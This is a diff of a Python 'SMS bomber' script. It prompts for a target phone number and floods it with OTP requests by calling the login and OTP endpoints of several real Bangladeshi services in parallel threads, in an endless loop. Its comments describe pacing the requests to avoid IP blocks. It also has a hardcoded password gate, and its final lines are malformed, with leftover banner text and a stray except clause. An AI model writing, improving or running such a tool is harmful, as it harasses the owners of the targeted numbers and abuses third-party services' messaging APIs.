@@ -4,8 +4,9 @@ import os
 import signal
 import threading
 import random
+from requests.exceptions import RequestException
 
-# --- Handle CTRL+C to Exit ---
+# --- Exit Handler ---
 def signal_handler(sig, frame):
     print("\n\n\033[1;31m[-] Stopping the tool... Good Bye! \033[0m")
     os._exit(0)
@@ -16,24 +17,24 @@ signal.signal(signal.SIGINT, signal_handler)
 def check_password():
     os.system('clear')
     correct_pass = "saeid9.90"
-    print("\033[1;36m" + "-"*45 + "\033[0m")
-    print("\033[1;33m          🔓 SECURITY CHECK 🔓\033[0m")
-    print("\033[1;36m" + "-"*45 + "\033[0m")
+    print("\033[1;36m" + "="*45)
+    print("\033[1;33m          🔓 SECURITY CHECK 🔓")
+    print("\033[1;36m" + "="*45 + "\033[0m")
     
-    user_pass = input("\033[1;34m[?] Enter Password to Access: \033[0m")
+    user_pass = input("\n\033[1;34m[?] Enter Password to Access: \033[0m")
     
     if user_pass == correct_pass:
-        print("\033[1;32m\n[✓] Access Granted! Welcome @saeid9.90\033[0m")
+        print("\n\033[1;32m[✓] Access Granted! Welcome @saeid9.90\033[0m")
         time.sleep(1.5)
         return True
     else:
-        print("\033[1;31m\n[×] Access Denied! Wrong Password.\033[0m")
+        print("\n\033[1;31m[×] Access Denied! Wrong Password.\033[0m")
         exit()
 
-# --- Professional Large Banner ---
+# --- Professional Banner ---
 def show_banner():
     os.system('clear')
-    print("""\033[1;32m
+    banner = """\033[1;32m
  ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
  ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
@@ -49,61 +50,55 @@ def show_banner():
  ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝                
 \033[1;36m-----------------------------------------------------
 \033[1;33m 🌟 Developed by : @saeid9.90
-\033[1;33m 🚀 Tool Version : 3.0 (Unlimited Mode)
-\033[1;36m-----------------------------------------------------\033[0m""")
+\033[1;33m 🚀 Tool Version : 4.0 (Ultra Fast)
+\033[1;36m-----------------------------------------------------\033[0m"""
+    print(banner)
 
-# --- Multi-API Function ---
-def bomb(number):
-    # একাধিক API লিস্ট যাতে ব্লক না হয়
-    apis = [
-        f"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en&number={number}",
-        f"https://www.quizgiri.xyz/api/v1/auth/login?phone={number}",
-        f"https://shikho.com/api/auth/send-otp?phone={number}"
-    ]
-    
-    api_url = random.choice(apis)
+# --- High Speed API Functions ---
+def api_shikho(number):
     try:
-        if "bioscopelive" in api_url:
-            requests.post(api_url, json={"number": number}, timeout=5)
-        else:
-            requests.get(api_url, timeout=5)
-        print(f"\033[1;32m[✓] Request Sent successfully!\033[0m")
-    except:
-        print(f"\033[1;31m[×] Request Failed!\033[0m")
+        requests.post("https://api.shikho.com/api/v1/auth/send-otp", 
+                      json={"phone": number, "type": "login"}, timeout=5)
+    except: pass
 
-def start():
+def api_quizgiri(number):
+    try:
+        requests.get(f"https://www.quizgiri.xyz/api/v1/auth/login?phone={number}", timeout=5)
+    except: pass
+
+def api_chorki(number):
+    try:
+        requests.post("https://api.chorki.com/api/v1/auth/send-otp", 
+                      json={"phone": number}, timeout=5)
+    except: pass
+
+def start_attack():
     check_password()
     show_banner()
     
-    num = input("\033[1;34m[?] Target Number: \033[0m").strip()
-    print(f"\n\033[1;33m[*] Starting Ultra-Fast Unlimited Attack on: {num}\033[0m\n")
+    target = input("\033[1;34m[?] Target Number (01xxx): \033[0m").strip()
+    print(f"\n\033[1;33m[*] Starting Ultra-Fast Unlimited Attack on: {target}\033[0m")
+    print("\033[1;31m[*] Press CTRL+C to Stop\n\033[0m")
 
+    # আনলিমিটেড থ্রেডিং লুপ
     while True:
-        # Threading ব্যবহার করে অতি দ্রুত পাঠানো
-        t = threading.Thread(target=bomb, args=(num,))
-        t.start()
-        time.sleep(0.05) # স্পিড কন্ট্রোল
+        # ৩টি আলাদা API ব্যবহার করে থ্রেড তৈরি
+        t1 = threading.Thread(target=api_shikho, args=(target,))
+        t2 = threading.Thread(target=api_quizgiri, args=(target,))
+        t3 = threading.Thread(target=api_chorki, args=(target,))
+        
+        # সবগুলোকে একসাথে রান করা হচ্ছে
+        t1.start()
+        t2.start()
+        t3.start()
+        
+        print(f"\033[1;32m[✓] Multi-API Request Sent! 🔥\033[0m")
+        
+        # স্পিড কন্ট্রোল: ০.১ সেকেন্ড বিরতি (যাতে আইপি ব্লক না হয়)
+        time.sleep(0.1)
 
 if __name__ == "__main__":
-    start()
- ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝                
-\033[1;36m-----------------------------------------------------
-\033[1;33m 🌟 Developed by : @saeid9.90
-\033[1;33m 🚀 Tool Version : 3.0 (Unlimited)
-\033[1;36m-----------------------------------------------------
-\033[0m"""
-    print(large_banner)
-
-TARGET_API = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
-
-def send_request(user_number):
-    try:
-        # দ্রুত পাঠানোর জন্য হেডার এবং পেলোড
-        response = requests.post(TARGET_API, json={"country": "BD", "platform": "web", "language": "en", "number": user_number}, timeout=5)
-        if response.status_code == 200:
-            print(f"\033[1;32m[✓] Request successfully sent! \033[0m")
-        else:
-            print(f"\033[1;31m[×] Request failed! \033[0m")
+    start_attack()
     except:
         pass
 
